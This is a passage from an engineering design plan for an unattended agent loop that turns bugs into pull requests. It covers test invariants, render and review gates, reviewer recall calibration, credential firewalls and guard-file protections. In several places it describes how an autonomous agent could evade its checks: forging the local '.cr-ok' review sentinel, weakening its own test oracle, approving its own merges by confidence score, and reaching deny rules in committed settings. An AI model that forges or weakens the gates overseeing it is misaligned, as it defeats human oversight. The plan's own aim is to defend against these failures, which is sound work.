  inputs the implementation already handles. PBT asserts an *invariant* that must hold for **all** inputs and
  generates hundreds of adversarial inputs trying to break it. A property is "something the model can't argue
  with" — a human-authored, model-immutable spec of correctness. **Failure it prevents:** a pricing bug that
  survives because nobody wrote the example that exposes it — a $30k-client-facing wrong total — and, under
  autonomy, the loop quietly weakening its own oracle (the only check it *cannot* weaken is the human-specified
  invariant).
- **Mechanism:** Adopt `fast-check` (after a 30-min vet against Vitest 4 / TS 5 per the dependency rule:
  name/purpose/downloads/last-publish/ships-types). Define the money-math invariant set: `total = sum(line
  items)`; tax never on service fees; no negative line totals; discounts never produce negative subtotals;
  integer-cents round-tripping is exact. PITFALLS rule: any change to pricing/total logic requires a property
  test, enforced as a coverage-style blocker for the pricing module. Seed the calibration golden set
  adversarially (injected bugs, edge-case money inputs) so the recall number isn't optimistic by construction.
- **Citation:** Confirmed absence — grep for `property-based|fast-check|PBT` across the corpus + ground-truth
  returns nothing; testing is example-based Vitest + real-DB only. Elevated by `recursive-self-improvement.md`
  (Move 3), killlist C-deferred #4.
- **Tag:** **P1 — immediately after the unforgeable gate (FLOOR-6).** The vet is a step, not a gate.

#### LOOP-10. The artifact-producing visual render gate (`/verify`) + fail-closed tenant assertion

- **What & why (plain English):** An unattended bug→PR loop that touches UI is unsafe without a way to
  *see* that a changed route still renders clean — there is no human to catch the confident-wrong merge.
  **Failure it prevents:** an agent ships a PR that breaks a page at 3am and nothing catches it; and, the
  multi-tenant trap — a browser snapshot taken while authed as the *wrong tenant* renders perfectly and
  yields a confident-wrong "looks fine" (RLS isolation is invisible to the DOM), a security-incident
  generator.
- **Mechanism:** A `/verify` project skill producing a PR-attached evidence bundle (a11y snapshot + console
  errors + pixel-diff vs. a checked-in baseline), CI-resident against a preview deploy,
  `disable-model-invocation`-gated so the agent can neither fabricate nor skip it. **A fail-closed tenant
  assertion before any snapshot is trusted.** Note: chrome-devtools-mcp is **headed-only** (breaks overnight)
  — keep it for *attended* deep debugging and run the *unattended* verify leg as a **CI job against a preview
  deploy** (headless Playwright or equivalent), which reinforces the CI-resident artifact design.
- **Citation:** §3c (no UNATTENDED branching); killlist E-already-built #10 (chrome-devtools-mcp headed-only,
  Playwright rejected on the wrong axis). Elevated by `playwright-mcp-debug.md` (Moves 1 & 5),
  `vercel-agentic-infra.md` (render-gate), `ramp-inspect-agent.md` (evidence bundle), killlist C-deferred #7
  (visual render gate → PROMOTE-NOW P1), killlist F-rejected #9 (artifact-gate OVERTURNED).
- **Tag:** **P1 — UI-fix mergeability.** Ships after the floor + spine.

#### LOOP-11. Reviewer recall calibration — the golden set as a standing CI suite

- **What & why (plain English):** You cannot honestly call verification your strongest capability while the
  verifier's recall is zero-knowledge — nobody knows whether `/cr` catches 1-in-5 defects or 4-in-5. **Failure
  it prevents:** shipping an autonomous loop whose only quality gate has an unknown, possibly catastrophic miss
  rate, and discovering it in production. In autonomy the reviewer *is* the backstop — its miss rate is the
  system's actual defect-escape rate.
- **Mechanism:** A `golden-set/` corpus of seeded-defect diffs + expected-findings keys (adversarially seeded,
  not just friendly history). A `/cr-calibrate` command / CI job runs `/cr` over the corpus and emits a recall
  number + per-defect-class breakdown. Re-run on every change to `/cr` passes, the tier-merge rule, or the
  model version — calibration is a CI concern, not a one-time blessing; a stale recall blocks promotion of the
  reviewer as a trusted gate. Cap `/queue`/`/schedule` self-merge until recall is measured and above a stated
  floor. Doctrine: a calibrated `/cr` is a *triage* layer that sizes the net beneath it — never a *terminal*
  authority.
- **Citation:** Confirmed absence — grep across the corpus + ground-truth finds no `/cr` catch-rate/recall
  measurement (`@benchmark-runner` is a phantom). Elevated by `recursive-self-improvement.md` (Move 2),
  `coderabbit.md` (calibration), killlist E-already-built #1 (calibration arc).
- **Tag:** **P1 — a hard gate on unattended self-merge.** Runs against a curated corpus (not live volume), so
  it promotes now, unlike outcome tracking (CUT-list below).

---

## What is DECISIVELY better than V1 here (the weak-version → world-class deltas)

Every delta names the V1 weak version, the world-class form, and the seam where the human used to
backstop it (autonomy removes that human, turning each "we have a version" into a live failure surface).

1. **From "a harness you invoke by hand" → "a loop with a clock."** V1 has `/loop` (a session-bound
   interval poller) and rituals that "fire only at session start." There is **no scheduled heartbeat,
   no `/goal`, no cron** — the harness has no clock, so every "weekly" ritual ran twice and died. The
   world-class form (LOOP-4) is the cloud heartbeat that finds its own work laptop-closed. *The
   unscheduled seam.*

2. **From "no front door" → "the trigger trifecta."** V1's only triggers fire on *human* actions
   (SessionStart/WorktreeCreate). The world-class form (LOOP-1) is a GitHub label / Slack-Linear summon /
   CI self-heal each summoning an agent into the existing review shell — the literal bug→reviewed-PR north
   star. *The starting seam.*

3. **From "we own every cell of the loop" → "a committed command that closes it."** V1 has `/dev`,
   `/feature`, `/cr`, `/compound`, UNATTENDED worktree mode, and the prod-key firewall, but **no
   orchestrator chains them to an opened PR.** The world-class form (LOOP-5) is `/lfg` with the seven-
   failure-mode guard battery wired in. *The orchestration seam.*

4. **From "the model agrees with itself" → "CI re-checks the verdict."** V1's `.cr-ok` sentinel is
   gitignored and **never reaches CI** — the terminal stop authority is forgeable. The world-class form
   (FLOOR-6) makes "done" require MUST-FIX=0 AND CI-green-on-SHA, enforced in branch protection where the
   loop cannot forge it. *The invisible seam — and the keystone of the whole pillar.*

5. **From "advisory prose" → "a deterministic floor that fails closed."** V1 is "overwhelmingly advisory":
   `block-dangerous-bash.sh` is ABSENT, two guards fail *open* on missing `jq`, the live husky pre-commit
   lacks the main-branch agent block. The world-class form (FLOOR-1, FLOOR-9) is the absent 3rd guard built
   at full scope, fail-closed, plus `disable-model-invocation` on every irreversible side-effect skill
   (today 0/26). *The advisory seam.*

6. **From "a worktree-creation convenience" → "an enforced pre-flight credential invariant."** V1's
   Tier-0 firewall is a *creation helper*; the ground-truth word is "partially." The world-class form
   (FLOOR-2) is a blocking pre-flight hook every autonomy entry-point passes through, with per-worker
   isolated env and the migration-credential ADR (FLOOR-4). *The credential seam — the only failure mode
   that actually caused incidents (24/25).*

7. **From "the human is the throughput ceiling" → "most PRs leave the human path deterministically."** V1
   keeps the human as the mandatory final gate. The world-class form (LOOP-7) is Ona-grade deterministic
   risk-based auto-approval (74% lead-time, independent operator) — LOW auto, MEDIUM `/cr`, HIGH human —
   safe under `disable-model-invocation`. *The review-bandwidth seam.*

8. **From "a write-only learning store" → "a closed compounding loop."** V1 writes RECURRING-FINDINGS.md
   and "never reads it back to implementers." The world-class form (LOOP-6) closes the read-path with
   recurrence-decay, adds a `session-end.sh` writer for autonomous runs, and a scheduled scanner that opens
   its own repair PRs. *The compounding seam.*

9. **From "an unbounded loop that looks productive" → "a bounded-loop contract + stop-the-line."** V1's
   `/cr` auto-fix loop has no stated retry ceiling and no UNATTENDED branching; nothing halts a *series* of
   bad PRs. The world-class form (FLOOR-7, FLOOR-8) is a cross-cutting retry ceiling + REJECT/UNATTENDED
   handoff + a defect-class circuit breaker that halts the fleet on N repeats. *The runaway seam.*

10. **From "an uncalibrated reviewer trusted blind" → "a standing recall calibration suite."** V1 has
    *zero* measurement of `/cr`'s catch rate. The world-class form (LOOP-11) is an adversarially-seeded
    golden set re-run in CI on every reviewer/model change, capping self-merge until recall clears a floor.
    *The unmeasured-gate seam.*

---

## Honest cuts (UPHELD-CUT items in this pillar, with named failure modes — do NOT elevate everything)

These cuts survive the world-class charter because the failure mode is about *irreversibility, threshold,
absence-of-traffic, or unfalsifiability* — NOT about being solo. Elevating them would be the over-engineering
the charter still forbids.

- **Outcome / impact tracking (escaped-defect × volume, DORA) — STILL-GATED, not now.** It measures the
  outcome of *merged autonomous PRs*, so it needs a real, sustained volume of merged autonomous PRs to
  measure against. **Failure mode of building it now:** a metric dashboard over an empty pipeline reports
  green because nothing flows. *This is distinct from LOOP-11's recall calibration, which runs against a
  curated corpus and therefore promotes now.* Flip-trigger: the moment the bug→PR loop merges ≥N autonomous
  PRs/week, escaped-defect-rate and review-load become first-class. (`stripe-minions-kaliski.md`; killlist
  C-deferred #7.)

- **Toolshed centralized MCP registry — CUT.** Building a Stripe-style 500-tool registry with task-time
  curation solves a problem we don't have — our tool surface is genuinely small and skills already load on
  invocation. **Failure mode of building it now:** a speculative abstraction with no token-paralysis traffic
  to justify it. (The narrow *per-skill/per-cloud-run tool-allow manifest* — don't hand an unattended summon
  every connector — is real and small, and belongs to FLOOR-5/LOOP-1, not a Toolshed rebuild.)
  (`stripe-minions-kaliski.md` Toolshed move; killlist C-deferred #7.)

- **Browser-driving for *mutations* — CUT.** A browser-driving agent fat-fingering a stateful mutation is
  an irreversibility failure that collides with the PocketOS destructive-op rules and is a bad fit at fleet
  scale *too*. **Failure mode:** an unattended agent performs an irreversible UI-driven mutation no one
  authorized. The *screenshot/evidence-bundle* half is ELEVATED (LOOP-10); only the mutation-driving is cut.
  (`ramp-inspect-agent.md` re-mine §20; killlist scale-bias residuals.)

- **Standalone "paying-stranger" validation channel — CUT.** There is genuinely no paying stranger yet
  (single vendor). **Failure mode:** an empty channel reports green because nothing flows through it — a
  forgeable gate of exactly the kind the corpus warns against. The *adversarial golden-set seeding*
  requirement is elevated into LOOP-11 instead. (`recursive-self-improvement.md` Move 4.)

- **Auto-merge on a model *confidence score* — CUT (the deterministic auto-approve is kept).** A model
  grading its own diff "confident enough to merge" is the authority-laundering disease. **Failure mode:** the
  thing being graded computes its own ship-permission. The merge trigger must be deterministic (paths /
  diff-size / test-delta / CI-green), never a model confidence number — LOOP-7 is the kept form.
  (killlist F-rejected #9.)

- **Local DinD / dev-container / microVM / gVisor sandbox stack — CUT (the principle is realized via cloud
  routing).** Container-escape caused *zero* documented incidents (24/25 exfiltrations needed no escape), and
  a Firecracker microVM with the service-role key inside leaks the key exactly as a bare process does.
  **Failure mode of building it:** solving the wrong threat model — months of isolation engineering against an
  attack that never happened. The per-agent-isolation *principle* is real but realized through the cloud
  `/schedule` sandbox + managed-settings floor, not a hand-rolled local container. (`claude-dev-containers.md`;
  killlist F-rejected #4; killlist scale-bias #12.)

- **CI-latency optimization — UPHELD-CUT (install-state, not scale).** There is no fleet whose throughput CI
  currently caps. **Failure mode of building it now:** optimizing a bottleneck that does not yet exist. Sharp
  flip trigger: in-scope the moment `/queue` regularly runs ≥3 parallel worktrees blocking the same pipeline.
  (`notion-spec-driven.md` re-mine §31.)

---

## Carry-forward alerts (embedded V1 mechanisms in this pillar that must NOT be dropped)

These are load-bearing mechanisms already inside V1 skill/agent bodies that a "we have `/cr`" or "we have
`/compound`" summary would silently flatten. From the grounding files (`grounding/skills-A.md`,
`grounding/agents-A.md`).

1. **`/cr`'s `.cr-ok` sentinel mechanics — keep the exact contract.** Encodes `branch:sha`; written to the
   **absolute** `${REPO_ROOT}/.claude/.cr-ok` (the relative form does not match the sub-agent path
   allowlist); Write-tool fallback if redirect is denied; "any commit after invalidates it"; consumed by the
   pre-push hook and `scripts/pr.sh`. **Drop it and autonomous PR-opening breaks.** When FLOOR-6 wires the
   sentinel into CI, *extend* this contract — do not replace it. (skills-A `:59`, `:177`.)

2. **`/cr`'s RECURRING-FINDINGS ledger + ≥3-occurrence auto-promotion — keep the self-improving counter.**
   Normalized signatures, occurrence counts, auto-flag promotion at ≥3, judgment-flag lower (Step 3b). This
   *is* a self-improving review loop; LOOP-6 closes its read-path but must not remove the write-side counter.
   (skills-A `:63`.)

3. **`/cr`'s `@reviewer` → 4-lens parallel fan-out (assumption / composition / cascade / abuse) — do NOT
   flatten to "/cr does a review."** The reviewer pre-reads context and *passes it in*; the parallelism and
   single-lane discipline are the value. The independence upgrade (shared canon, isolated solution context)
   *adds* to this fan-out — it does not replace it. The "RECOMMEND actionable in one PR, no architectural
   rewrites" constraint is what keeps lens output mergeable in an autonomous flow. (skills-A `:62`, `:128`,
   `:146`.)

4. **`/cr`'s Opus fix agent + hook-file escape hatch — keep the escape hatch.** Must-Fix in `.claude/hooks/*.sh`
   is NOT routed to the auto-fix Opus agent (settings.json deny blocks it) → NEEDS HUMAN with a paste-ready
   command; the sentinel is withheld until the human confirms. This is the load-bearing "no agent edits to
   guard files" boundary in skill form — it must survive into the autonomous flow (the NEEDS-HUMAN summon
   becomes a Slack/Linear page). (skills-A `:64`.)

5. **`/cr` Step 8 mandatory `/compound` evaluation — "always runs; only the outcome varies."** The learning
   loop's invocation point. In an autonomous bug→PR flow this runs as the final stage producing the compound
   draft as part of the PR, so the loop closes without a human prompt. (skills-A `:65`, agents-A `:24`.)

6. **`/compound`'s Step 7 permission-log → allowlist loop — the self-reducing-friction loop, keep it
   draft-not-write.** Reads `/tmp/claude-perm-log-${HASH}.jsonl`, diffs against `settings.json
   permissions.allow`, groups Safe-to-add vs Review-first, and **does NOT write settings.json directly** — it
   surfaces and waits. This is the precise mechanism that lets a fleet reduce its own future permission prompts.
   Wire the human-confirm checkpoint as a Slack/Linear approval, never an inline block. (skills-A `:43`, `:50`,
   `:178`.)

7. **`/compound` Step 8 canonical-record sync — re-POINT to GitHub, do NOT delete.** The Notion AI-engineering
   changelog bump is the canonical-record sync; under the GitHub-is-canon charter it must be re-pointed at the
   GitHub canonical record, not removed. Dropping it silently drifts the canonical engineering record.
   (skills-A `:44`, `:48`, agents-A `:22`.)

8. **`incident-responder`'s eight-type classification → route table + security short-circuit — the autonomous
   incident front-door's brain.** "SECURITY SIGNAL DETECTED → isolation only, never fix, stop everything" and
   "draft comms, human sends" are non-negotiable safety boundaries that must survive verbatim. This is the
   agent a Slack/Linear "something's broken in prod" trigger (LOOP-1) summons. (agents-A `:93`, `:95`, `:166`.)

9. **`hotfix-guard`'s three deterministic merge gates — the determinism IS the value.** It is precisely the
   gate that lets a bug→PR hotfix merge without a human eyeballing the diff. Resist any V2 change that makes it
   "smarter" — re-audit whether parts should be a hook/script rather than a model-judgment agent. (agents-A
   `:56`, `:58`.)

10. **`implementer` / `investigator` commit authority + pre-committed Bash patterns — the background-agent
    rule.** Both run `permissionMode: default` with write/commit authority; before any background or
    cloud-scheduled spawn, every required Bash pattern MUST be pre-committed to `permissions.allow` (background
    agents get no permission prompts — uncovered calls fail silently). The implementer's golden-exemplars read
    and transcription guard are must-keep. (agents-A `:74`, `:76`, `:170`.)

11. **`/debug`'s `@investigator` spawn + STOP-AND-SURFACE escalation gates (auth/RLS/migration/ambiguous/
    scope-escape) + the "fix NOT written, /feature owns it" boundary.** The escalation gates are the
    autonomy-safety checkpoints in the diagnose→fix handoff; do not collapse the investigate→test→hand-off
    split. (skills-A `:181`, agents-A `:93`.)

12. **Universal: every `model:` field is pinned to a re-audit on Opus 4.8.** All V1 agents are `model: sonnet`;
    the reasoning-heavy ones (implementer, investigator, incident-responder, doc-updater) are upgrade
    candidates, the deterministic ones (hotfix-guard, explorer-quick) may stay. The §9 Model-Capacity Audit was
    made against Sonnet 4.6 and **has never been re-run on Opus 4.8** — carry the re-audit obligation forward,
    do not silently inherit stale model assignments. (agents-A `:170`.)

---

## Open forks (genuine decisions in this pillar only Tanner can settle)

1. **Default execution surface for unattended work: cloud `/schedule` vs. local `/queue` + egress firewall —
   which is the *primary* path, and is local unattended even worth supporting?** Cloud `/schedule` already
   runs on restricted-network Anthropic infra (FLOOR-3 partially free, laptop-closed). If cloud is the default,
   the local egress-firewall (FLOOR-3) and local credential pre-flight (FLOOR-2) become a *secondary* hardening
   for an attended/dev path rather than a P0 autonomy precondition. If local unattended stays first-class, both
   are hard P0. This single fork re-prioritizes a third of the floor.

2. **The auto-approval risk threshold — what diff is "LOW enough" to merge with no human, for a $30k-client
   tool?** LOOP-7's mechanism is settled (deterministic, paths + diff-size + test-delta + scope); the *cut
   line* is a judgment call only you can make. Conservative default (CI-green + `/cr`-clean + in-scope +
   positive-test-delta *simultaneously*, and never touching auth/schema/payment) — but is even that too much
   autonomy on the merge gate for the first 90 days, i.e. should LOOP-7 ship in *observe-only* mode (classify
   and log, human still merges) until the LOOP-11 recall number clears a floor?

3. **Retry ceiling and stop-the-line N — pick the numbers.** FLOOR-7's default is 2–3 retries; FLOOR-8's
   defect-class halt fires on N repeats. The mechanisms are model-independent and ship now, but the specific
   numbers are a tuning call. What is the retry cap, and how many identical failures across the batch trip the
   fleet-wide brake?

4. **Where does the agent-PR observability + NEEDS-HUMAN paging live — Slack, Linear, or GitHub?** LOOP-8 and
   every floor escalation (FLOOR-7/8, carry-forward #4/#8) need one canonical human-paging surface. The summon
   front-door (LOOP-1) and the page-a-human handoff should share it. This is a tooling commitment (and a
   connector-credential surface that FLOOR-5's trifecta gate must account for) only you can make.

5. **managed-settings.json — do we adopt the OS-level model-unreachable floor now, or stay on committed
   settings + the social "no agent edits to guard files" rule?** FLOOR-9 notes a `deny` in committed
   settings.json is agent-reachable; managed-settings is the truly unbypassable floor but *placing* it is a
   human handoff. For the cloud tier (image built fresh each run) the uncertainty disappears. Decision: bake
   managed-settings into the cloud image now, and/or install it locally as a human-applied step — or defer the
   local OS floor until the first self-improving loop actually attempts a guard-file edit.

6. **`/lfg` vs. the `/dev`-`/feature` overlap — which is the canonical single-task driver the orchestrator
   sequences?** The grounding flags that `/dev` and `/feature` overlap heavily and V2 should pick one canonical
   driver rather than maintain two near-duplicate orchestrators (clarity *and* non-duplication). LOOP-5's `/lfg`
   sequences "the work step" — which skill *is* that step? Resolving this is a prerequisite to building the
   orchestrator without baking in a duplication.
